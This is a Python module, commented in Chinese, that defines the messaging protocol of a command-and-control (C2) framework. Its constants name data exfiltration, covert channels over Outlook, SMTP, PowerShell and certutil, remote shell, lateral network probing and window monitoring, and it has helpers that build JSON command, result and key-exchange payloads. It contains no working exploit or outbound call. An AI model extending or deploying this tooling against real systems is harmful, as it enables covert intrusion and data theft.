import uuid
import time
import struct
import json


# ── 消息类型常量 ──────────────────────────────────────────

MSG_CMD = "cmd"              # 控制端发送的指令
MSG_RESULT = "result"        # Agent 返回的执行结果
MSG_HEARTBEAT = "heartbeat"  # 心跳保活
MSG_EXFIL = "exfil"          # 数据外传
MSG_KEY_EXCHANGE = "key_exchange"  # 密钥交换
MSG_REGISTER = "register"    # Agent 注册上线

# ── 通道类型常量 ──────────────────────────────────────────

CHANNEL_TCP = "tcp"
CHANNEL_UDP = "udp"
CHANNEL_OUTLOOK = "outlook"
CHANNEL_SMTP = "smtp"
CHANNEL_POWERSHELL = "powershell"
CHANNEL_CERTUTIL = "certutil"

# ── 指令类型常量 ──────────────────────────────────────────

CMD_EXEC = "exec"            # 执行系统命令
CMD_DOWNLOAD = "download"    # 下载文件（从 Agent 传到 Controller）
CMD_UPLOAD = "upload"        # 上传文件（从 Controller 传到 Agent）
CMD_SYSINFO = "sysinfo"      # 获取系统信息
CMD_MODULES = "modules"      # 列出已加载模块
CMD_LOAD_MODULE = "load_mod" # 加载指定模块
CMD_RUN_MODULE = "run_mod"   # 执行已加载模块
CMD_SHELL = "shell"          # 交互式 shell
CMD_NETPROBE = "netprobe"    # 内网横向探测 (拓展)
CMD_WINMON = "winmon"        # 窗口信息采集 (拓展)
CMD_EXIT = "exit"            # 退出

# ── 分片传输相关 ─────────────────────────────────────────

FRAG_HEADER_KEY = "__frag__"  # args 中的分片元数据键名


class Protocol:
    """C2 通信协议工具类"""

    @staticmethod
    def new_session_id() -> str:
        return str(uuid.uuid4())

    @staticmethod
    def build_command(cmd_type: str, args: dict = None) -> bytes:
        """构建指令负载"""
        payload = {
            "command": cmd_type,
            "args": args or {},
            "timestamp": time.time(),
        }
        return json.dumps(payload, ensure_ascii=False).encode("utf-8")

    @staticmethod
    def parse_command(data: bytes) -> dict:
        """解析指令负载"""
        return json.loads(data.decode("utf-8"))

    @staticmethod
    def build_result(status: str, data: str, error: str = None) -> bytes:
        """构建执行结果负载"""
        payload = {
            "status": status,
            "data": data,
            "error": error,
            "timestamp": time.time(),
        }
        return json.dumps(payload, ensure_ascii=False).encode("utf-8")

    @staticmethod
    def parse_result(data: bytes) -> dict:
        """解析执行结果负载"""
        return json.loads(data.decode("utf-8"))

    @staticmethod
    def build_heartbeat() -> bytes:
        return json.dumps({"ts": time.time()}).encode("utf-8")

    @staticmethod
    def build_register_info(info: dict) -> bytes:
        """构建 Agent 注册信息"""
        return json.dumps(info, ensure_ascii=False).encode("utf-8")

    @staticmethod
    def build_key_exchange(public_key_pem: bytes) -> bytes:
        """构建密钥交换消息"""
        return json.dumps({
            "type": "key_exchange",
            "public_key": public_key_pem.decode("utf-8"),
        }).encode("utf-8")

    @staticmethod
    def parse_key_exchange(data: bytes) -> bytes:
        """解析密钥交换消息，返回对方公钥"""
        msg = json.loads(data.decode("utf-8"))
        return msg["public_key"].encode("utf-8")
